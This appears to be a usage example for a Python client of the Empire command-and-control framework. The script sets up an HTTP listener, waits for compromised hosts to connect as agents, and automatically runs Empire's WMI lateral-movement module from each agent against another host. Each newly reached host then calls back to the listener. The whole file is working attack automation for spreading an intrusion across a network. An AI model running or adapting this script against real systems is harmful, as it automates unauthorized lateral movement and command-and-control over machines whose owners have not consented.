import asyncio
from utinni import EmpireApiClient

async def main():
    # Create client instance
    empire = EmpireApiClient(host="localhost", port="1337")

    # Login to Empire's RESTful API
    await empire.login("username", "password")
    print("* Logged into Empire")

    # Create a listener
    await empire.listeners.create(listener_type="http", name="Utinni", additional={"Port": 8443})

    print("* Waiting for agents...")
    while True:
        # Poll for new agents every 1 sec
        for agent in await empire.agents.get():

            # Print some basic info on the new agent
            print(f"+ New agent '{agent.name}' connected: {agent.domain}\\{agent.username}")

            # Execute a module on the agent
            module_output = await agent.execute(
                    "powershell/lateral_movement/invoke_wmi",
                    options={
                        "ComputerName": "targethost",
                        "Listener": "Utinni",
                    },
                )

            print(f"++ Executed invoke_wmi module on agent '{agent.name}'")
            print(f"++ Module output: {module_output}")

        await asyncio.sleep(1)

# Start the event loop
asyncio.run(main())
